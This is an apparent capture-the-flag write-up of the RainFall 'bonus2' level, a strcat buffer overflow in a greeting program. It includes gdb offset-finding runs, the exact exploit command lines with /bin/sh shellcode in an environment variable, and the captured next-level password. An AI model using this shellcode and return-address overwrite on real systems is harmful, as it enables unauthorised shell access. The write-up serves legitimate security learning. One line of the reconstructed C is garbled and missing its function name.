# bonus2

### First analysis

For this level we have two functions, a main and a greetuser function that we can see here:

```c
int language;

int greetuser(char *src) {
    char    dest[64];

    if ( language == 1 ) {
        (dest, "\x48\x79\x76\xc3\xa4\xc3\xa4\x20\x70\xc3\xa4\x69\x76\xc3\xa4\xc3\xa4\x20", 13);
    }
    else if (language == 2) {
        strncpy(dest, "Goedemiddag! ", 13);
    }
    else {
        strncpy(dest, "Hello ", 7);
    }

    strcat(dest, src);
    return puts(dest);
}

int main(int ac, char **av) {
    char    buffer[76];
    char    buffer_final[76];
    char    *lang;

    if (ac != 3)
        return 1;

    memset(buffer, 0, sizeof(buffer));
    strncpy(buffer, av[1], 40);
    strncpy(buffer + 40, av[2], 32);
    lang = getenv("LANG");

    if (lang) {
        if (!memcmp(lang, "fi", 2)) {
            language = 1;
        } else if (!memcmp(lang, "nl", 2)) {
            language = 2;
        }
    }

    memcpy(buffer_final, buffer, sizeof(buffer_final));

    return greetuser(buffer);
}
```

As we can see we have a global static variable language. The main will start by creating 2 buffers of 76, then cleaning it, and write in it av[1] and 40 char later at buffer[40], av[2]. It will then get the env variable LANG that will be stored into a lang variable. Then something comparable with a switch statement will read this variable content, and if it starts with "fi", the language will be set at 1, if it starts with nl, it will be set at 2. We then copy our buffer into a final buffer that will be given to greetuser. greetuser will then check the value of language and write a message in the language according to that. Copy the message into a new buffer of 64, and then concatenate this message with the final buffer of 76. Which (if our buffer size is correct) could lead to an overflow of 25 bits.

When trying to write payloads with a lot of characters we can observe this:

```sh
(gdb) run $(python -c "print('A' * 200)") $(python -c "print('A' * 200)")
Starting program: /home/user/bonus2/bonus2 $(python -c "print('A' * 200)") $(python -c "print('A' * 200)")
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

We can see that the segfault address is 0x41414141. So we can edit an address of redirection. We can now search for the precise padding:

```sh
(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwyyyyzzzz
Starting program: /home/user/bonus2/bonus2 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwyyyyzzzz
Goedemiddag! AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJaaaabbbbccccddddeeeeffffgggghhhh

Program received signal SIGSEGV, Segmentation fault.
0x67676766 in ?? ()
```

We land on 0x67676766 so fggg in hexadecimal, which means it is 23 char of padding in the second buffer. We can try again by filling the first av[1] so with 40 chars, and the second with just enough to edit the address:

```sh
(gdb) run $(python -c "print('A' * 40)") $(python -c "print('A' * 23 + 'BCBC')")
Starting program: /home/user/bonus2/bonus2 $(python -c "print('A' * 40)") $(python -c "print('A' * 23 + 'BCBC')")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCBC

Program received signal SIGSEGV, Segmentation fault.
0x43424342 in ?? ()
```

Perfect we are now sure of where to edit the return address. So as we do since two levels we are going to try the env variable method, and see if it can works. And surprisingly again, it works:

```sh
bonus2@RainFall:~$ export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
bonus2@RainFall:/tmp$ ./a.out SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xbffff71b
Lil-endian format: \x1b\xf7\xff\xbf
bonus2@RainFall:~$ ./bonus2 $(python -c "print('A' * 40)") $(python -c "print('A' * 23 + '\x1b\xf7\xff\xbf')")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

As we can see there is clearly a problem those past 2 exercises, bonus1 and bonus2 are solved by the same method as bonus0, and we start to feel that we are losing the actual point of the exercice. We definitely need to search deeper to understand what this exercice want from us.
